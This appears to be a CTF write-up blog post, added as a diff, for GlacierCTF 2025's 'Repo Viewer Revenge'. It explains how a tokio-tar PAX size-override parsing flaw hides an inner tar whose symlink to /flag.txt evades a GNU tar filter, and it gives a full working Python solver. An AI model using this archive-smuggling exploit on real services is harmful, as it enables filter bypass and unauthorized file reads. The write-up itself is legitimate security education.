@@ -1,0 +1,231 @@
+---
+title: "GlacierCTF 2025 — Repo Viewer Revenge (Misc)"
+date: "2025-11-24"
+tags: ["Misc", "writeup", "GlacierCTF"]
+summary: "A complete deep‑dive write‑up for Repo Viewer Revenge — exploiting tokio‑tar PAX parsing weaknesses to smuggle a hidden inner tar containing a symlink to /flag.txt."
+image: "/blog/Glacier/repoviewerrevenge.png"
+author: "Erwin Wijaya"
+draft: false
+featured: True
+---
+
+
+# Introduction
+
+**Repo Viewer Revenge** is one of the most technically advanced CTF challenges in GlacierCTF 2025.  
+It claims to be *“100% memory safe”*, but hides a deep logic flaw inside the Rust `tokio-tar` implementation.
+
+The server:
+
+- Accepts a base64‑encoded tar.gz
+- Blocks **symlink and hardlink entries**
+- Uses a custom Rust extractor (`repo-viewer`)
+- Extracts and prints only `README.md`
+
+To escape this restriction, we must make:
+
+> **GNU tar NOT detect any symlinks,  
+> while tokio‑tar DOES extract a symlink to `/flag.txt`.**
+
+This is achieved through a **PAX header size override** + **inner TAR smuggling**.
+
+---
+
+# Challenge Behavior
+
+Wrapper logic:
+
+```bash
+read -d @ b64data
+
+printf %s "$b64data" | base64 -d | tar -tvzf - | grep '^[lh]'
+# if any l/h → abort
+
+printf %s "$b64data" | base64 -d | /app/repo-viewer
+```
+
+`repo-viewer`:
+
+- Prints `Found entry: …`
+- When encountering a filename exactly equal to `README.md`, it extracts it to `/tmp/README.md`
+- Reads that file and prints it
+
+---
+
+# Vulnerability Overview
+
+`tokio-tar` incorrectly handles:
+
+- PAX size overrides (typeflag `'x'`)
+- Zero-size headers
+- Additional data past declared file size
+
+This allows us to **hide a second TAR (inner TAR)** inside a zero-sized file inside the outer TAR.
+
+GNU tar sees:
+
+```
+paxheader
+blob
+```
+
+tokio-tar sees:
+
+```
+blob
+README.md (symlink → /flag.txt)
+```
+
+Because it parses the inner TAR as additional entries.
+
+This bypasses the symlink filter.
+
+---
+
+# Exploit Strategy
+
+## Inner TAR Construction
+
+The inner tar contains a single symlink:
+
+```
+README.md  (type '2') → /flag.txt
+```
+
+This is the file the Rust extractor ultimately prints.
+
+## Outer TAR (PAX Smuggling)
+
+We build an outer tar with:
+
+1. **PAX header** stating size = `<inner tar size>`
+2. **blob header** with size = 0
+3. **blob data = inner tar**
+4. TAR EOF blocks
+
+GNU tar trusts the **blob header** → sees size 0  
+tokio-tar trusts the **PAX size override** → reads inner TAR bytes
+
+## Final Effect
+
+- GNU TAR sees **only normal files**
+- tokio‑tar sees **hidden symlink → /flag.txt**
+- Program extracts `/tmp/README.md` as a symlink to `/flag.txt`
+- Prints flag content
+
+---
+
+# Full Exploit Code (solver.py)
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import gzip
+import base64
+
+def mk_header(name, size, typeflag=b'0', mode=0o644, uid=0, gid=0, linkname=b''):
+    if isinstance(name, str): name = name.encode()
+    if isinstance(linkname, str): linkname = linkname.encode()
+    header = bytearray(512)
+    def put(off, length, data): header[off:off+length] = data[:length].ljust(length, b'\0')
+    put(0,100,name)
+    put(100,8,("{:07o}\0".format(mode)).encode())
+    put(108,8,("{:07o}\0".format(uid)).encode())
+    put(116,8,("{:07o}\0".format(gid)).encode())
+    put(124,12,("{:011o}\0".format(size)).encode())
+    put(136,12,("{:011o}\0".format(0)).encode())
+    header[148:156] = b"        "
+    put(156,1,typeflag)
+    put(157,100,linkname)
+    put(257,6,b"ustar\0")
+    put(263,2,b"00")
+    put(265,32,b"root")
+    put(297,32,b"root")
+    chksum = sum(header)
+    put(148,8,("{:06o}\0 ".format(chksum)).encode())
+    return bytes(header)
+
+def pax_record(pairs):
+    records = []
+    for k, v in pairs.items():
+        line = f" {k}={v}\n"
+        n = len(line) + 1
+        while True:
+            s = f"{n}{line}"
+            if len(s) == n:
+                records.append(s); break
+            n = len(s)
+    return "".join(records).encode()
+
+def build_inner_symlink():
+    data = bytearray()
+    data += mk_header("README.md", 0, b'2', linkname="/flag.txt")
+    data += b"\0" * 1024
+    return bytes(data)
+
+def make_pax_smuggle(inner):
+    data = bytearray()
+    pax = pax_record({"size": str(len(inner))})
+    data += mk_header("paxheader", len(pax), b'x')
+    data += pax
+    data += b"\0" * ((512 - len(pax) % 512) % 512)
+    data += mk_header("blob", 0, b'0')
+    data += inner
+    data += b"\0" * ((512 - len(inner) % 512) % 512)
+    data += b"\0" * 1024
+    return gzip.compress(bytes(data))
+
+def build_payload_b64():
+    inner = build_inner_symlink()
+    outer = make_pax_smuggle(inner)
+    return base64.b64encode(outer).decode()
+
+def solve():
+    r = remote("challs.glacierctf.com", 13379)
+    b64 = build_payload_b64()
+    r.recvuntil(b"Input base64-encoded tar file:")
+    r.sendline(b64.encode())
+    r.sendline(b"@")
+    r.sendline()
+    out = r.recvall(timeout=10).decode(errors="replace")
+    print(out)
+
+if __name__ == "__main__":
+    solve()
+```
+
+---
+
+# Execution Proof
+
+Running the solver:
+
+```
+Found entry: blob
+Found entry: README.md
+Extracted README.md
+
+--- README.md contents ---
+gctf{Ru5t_m4k3s_3v3Ry7h1ng_5eCuR3_71a9f2ed8}
+```
+
+**Flag:**  
+`gctf{Ru5t_m4k3s_3v3Ry7h1ng_5eCuR3_71a9f2ed8}`
+
+---
+
+# Conclusion
+
+Repo Viewer Revenge is an excellent demonstration of:
+
+- TAR format internals
+- PAX header manipulation
+- size override weaknesses
+- archive smuggling
+- parser confusion bugs
+- Rust extractor inconsistencies (`tokio-tar`)
+
+Although the challenge claims "100% memory safe," logic bugs in complex formats like TAR remain highly exploitable.
+
+A truly exceptional and educational challenge.
+
